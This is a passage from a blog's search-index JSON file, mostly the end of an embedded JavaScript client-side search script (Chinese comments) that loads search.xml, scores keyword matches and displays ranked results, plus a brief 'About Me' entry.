// 防抖函数\n          const debounce = (func, delay) => {\n            let timer\n            return function (...args) {\n              clearTimeout(timer)\n              timer = setTimeout(() => func.apply(this, args), delay)\n            }\n          }\n\n          // 汉字转拼音 (简单首字母匹配)\n          const toPinyin = (str) => str.normalize(\"NFD\").replace(/[\\u0300-\\u036f]/g, \"\")\n\n          // 加载 search.xml\n          fetch(searchPath)\n            .then((response) => {\n              if (!response.ok) {\n                throw new Error(\"搜索数据加载失败\")\n              }\n              return response.text()\n            })\n            .then((str) => new window.DOMParser().parseFromString(str, \"text/xml\"))\n            .then((data) => {\n              const entries = data.getElementsByTagName(\"entry\")\n              if (entries.length === 0) {\n                console.warn(\"搜索数据为空\")\n                return\n              }\n\n              searchData = Array.from(entries)\n                .map((entry) => {\n                  const titleEl = entry.getElementsByTagName(\"title\")[0]\n                  const urlEl = entry.getElementsByTagName(\"url\")[0]\n                  const contentEl = entry.getElementsByTagName(\"content\")[0]\n\n                  return {\n                    title: titleEl ? titleEl.textContent : \"\",\n                    url: urlEl ? urlEl.textContent : \"\",\n                    content: contentEl ? contentEl.textContent : \"\",\n                  }\n                })\n                .filter((item) => item.title && item.url) // 过滤掉无效数据\n\n              console.log(`已加载 ${searchData.length} 条搜索数据`)\n            })\n            .catch((error) => {\n              console.error(\"搜索数据加载错误:\", error)\n              // 可以在这里添加用户友好的错误提示\n            })\n\n          // 清空按钮事件\n          clearBtn.addEventListener(\"click\", () => {\n            input.value = \"\"\n            resultContainer.innerHTML = \"\"\n            clearBtn.style.display = \"none\"\n            input.focus() // 重新聚焦到输入框\n          })\n\n          // 搜索函数\n          const doSearch = () => {\n            const keyword = input.value.trim().toLowerCase()\n\n            // 清空结果\n            resultContainer.innerHTML = \"\"\n\n            if (!keyword) {\n              clearBtn.style.display = \"none\"\n              return\n            }\n\n            // 显示清空按钮\n            clearBtn.style.display = \"block\"\n\n            // 检查搜索数据是否已加载\n            if (searchData.length === 0) {\n              resultContainer.innerHTML = \"搜索数据加载中，请稍后再试...\"\n              return\n            }\n\n            const keywords = keyword.split(/\\s+/).filter((kw) => kw.length > 0)\n            const results = []\n\n            searchData.forEach((item) => {\n              const title = item.title.toLowerCase()\n              const content = item.content.toLowerCase()\n              const titlePinyin = toPinyin(title)\n              const contentPinyin = toPinyin(content)\n              let score = 0\n\n              keywords.forEach((kw) => {\n                // 标题匹配权重更高\n                if (title.includes(kw) || titlePinyin.includes(kw)) score += 5\n                // 内容匹配\n                if (content.includes(kw) || contentPinyin.includes(kw)) score += 1\n                // 完全匹配额外加分\n                if (title === kw || content.includes(kw)) score += 2\n              })\n\n              if (score > 0) {\n                let displayTitle = item.title\n\n                // 高亮关键词\n                keywords.forEach((kw) => {\n                  displayTitle = highlight(displayTitle, kw)\n                })\n\n                results.push({\n                  score,\n                  title: displayTitle,\n                  url: item.url,\n                })\n              }\n            })\n\n            // 显示结果\n            if (results.length === 0) {\n              resultContainer.innerHTML = \"sry,没有相关内容 可以下方留言让我补充！\"\n              return\n            }\n\n            // 按分数排序\n            results.sort((a, b) => b.score - a.score)\n\n            // 限制显示结果数量\n            const maxResults = 15\n            const displayResults = results.slice(0, maxResults)\n\n            const html = displayResults\n              .map(\n                (r) => `\n  \n    ${r.title}\n  \n`,\n              )\n              .join(\"\")\n\n            resultContainer.innerHTML = html\n\n            // 如果结果被截断，显示提示\n            if (results.length > maxResults) {\n              resultContainer.innerHTML += `显示前 ${maxResults} 条结果，共找到 ${results.length} 条`\n            }\n          }\n\n          // 输入事件监听\n          input.addEventListener(\"input\", debounce(doSearch, 300))\n\n          // 回车键搜索\n          input.addEventListener(\"keydown\", (e) => {\n            if (e.key === \"Enter\") {\n              e.preventDefault()\n              doSearch()\n            }\n          })\n\n          // 点击搜索按钮\n          const searchButtons = document.querySelectorAll(\".search-btn\")\n          searchButtons.forEach((btn) => {\n            btn.addEventListener(\"click\", (e) => {\n              e.preventDefault()\n              if (input.value.trim()) {\n                doSearch()\n              } else {\n                input.focus()\n              }\n            })\n          })\n\n          // 点击页面其他地方隐藏搜索结果\n          document.addEventListener(\"click\", (e) => {\n            if (!e.target.closest(\".search-container\")) {\n              // 可以选择是否隐藏结果，这里注释掉以保持结果可见\n              // resultContainer.innerHTML = '';\n              // clearBtn.style.display = 'none';\n            }\n          })\n        })()\n    \n\n\n","url":"search/index.html","date":"2025-08-05"},{"title":"About Me","content":"&lt;%- partial(‘_custom&#x2F;page-about-me’) %&gt;\n","url":"about/index.html","date":"2025-08-06"}]}